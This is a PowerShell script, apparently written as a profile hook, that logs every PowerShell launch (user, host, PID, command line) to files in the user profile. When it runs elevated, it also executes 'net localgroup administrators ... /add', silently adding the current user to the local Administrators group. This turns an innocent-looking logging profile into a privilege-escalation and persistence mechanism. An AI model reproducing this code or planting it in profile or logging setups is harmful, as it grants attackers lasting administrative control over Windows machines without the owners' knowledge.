# Logging path for all profile hooks
$_logpath = "${ENV:USERPROFILE}\ps.log"
# Logging path for only privileged hooks
$_privlogpath = "${ENV:USERPROFILE}\ps-privs.log"

# Create log files if necessary
$_logexists = Test-Path $_logpath
$_privlogexists = Test-Path $_privlogpath
$_logheader = 'TimeStamp, Hostname, Username, Privileges, PID, Command Line, Calling Script/Command'
if (!$_logexists) { $_logheader | Out-File -Encoding utf8 -FilePath $_logpath }
if (!$_privlogexists) { $_logheader | Out-File -Encoding utf8 -FilePath $_privlogpath }

# Collect log data
$_timestamp = Get-Date -Format "o"
$_hostname = $env:COMPUTERNAME
$_username = whoami
# Get calling proc information, $PID is a built-in variable which refers to the PID of the current process
$_PSPROC = Get-CimInstance win32_process -Filter "processid=$PID"
# Check for privileges (not all encompassing, but works for most cases)
$_privcheck = [System.Security.Principal.WindowsIdentity]::GetCurrent().groups -Contains 'S-1-5-32-544'
# Attempt to read process CommandLine options
$_powershellCommandLine = $_PSPROC.CommandLine
# Capture the calling command
$_callingcommand = $($MyInvocation.MyCommand)

# Build the log entry
$_logline = "$_timestamp, $_hostname, $_username, Privs: $_privcheck, $PID, $_powershellCommandLine, $_callingcommand"
# Write the log entry
$_logline | Out-File -Encoding utf8 -Append -FilePath $_logpath

if ($_privcheck -eq 'True') {
    # Hook elevated processes inside this loop
    $_logline | Out-File -Encoding utf8 -Append -FilePath $_privlogpath
    # Command to run with administrative privileges
    net localgroup administrators "$ENV:USERDOMAIN\$ENV:USERNAME" /add
} else {
    # hook user level code here
}
